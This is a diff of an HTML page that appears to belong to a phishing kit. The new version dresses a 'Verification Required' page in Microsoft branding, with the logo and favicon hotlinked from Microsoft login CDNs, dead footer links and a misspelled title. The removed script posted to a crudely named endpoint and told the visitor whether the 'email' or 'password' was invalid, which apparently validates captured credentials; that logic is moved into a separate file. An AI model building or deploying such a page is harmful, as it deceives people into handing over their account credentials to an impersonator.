@@ -1,53 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-    <title> Verify </title>
-    <link rel="stylesheet" href="style.css"/>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://logincdn.msauth.net/16.000.30031.21/images/favicon.ico" />
+    <title>Vetification Required</title>
+    <link rel="stylesheet" href="verify.css" />
 </head>
+
 <body>
-<h1>DO NOT REFRESH OR PRESS BACK BUTTON DURING THE PROCESS! <br> If it takes longer than 30 seconds then refresh and try again.</h1>
-<button class="btn" id="myButton">Verify</button>
-<p class="p1" id="p1"></p>
+    <section id="section_final">
+        <div class="auth-wrapper">
+            <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg"
+                alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+            </div>
+            <h2 id="p1" class="title mb-16">Verification Required</h2>
+            <p id="p2" class="p">Press the button below to verify.</p>
 
-<div id="loader" class="loader"></div>
+            <div id="loader" class="loader"></div>
 
+            <div class="btn-group">
+                <button class="btn" id="btn1">Verify</button>
+            </div>
+        </div>
+    </section>
 
-<script>
-    document.getElementById("myButton").addEventListener("click", function() {
-        let btn = document.getElementById("myButton");
-        let p1 = document.getElementById("p1");
-        let loader = document.getElementById("loader");
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
 
-        btn.disabled = true;
-        p1.textContent = "Verifying...";
-        loader.style.display = "block";
-
-        fetch('/bhenchod', {
-            method: 'POST'
-        })
-        .then(response => {
-            if (response.ok) { // if status code is 200
-                p1.textContent = "verified";
-                window.location.href = '/index3.html'; // redirect to index3.html
-                loader.style.display = "none";
-            } else if (response.status == 402) {
-                alert('email is invalid');
-                p1.textContent = "The email is incorrect. Try Again";
-                loader.style.display = "none";
-            } else if (response.status == 401) {
-                alert('password is invalid');
-                p1.textContent = "The password is incorrect. Try Again";
-                loader.style.display = "none";
-            } else {
-                alert('something went wrong :(');
-                p1.textContent = "Server side issue has occured. Please Try Again Later";
-                loader.style.display = "none";
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-    });
-</script>
+    <script src="verify.js"></script>
 </body>
+
 </html>
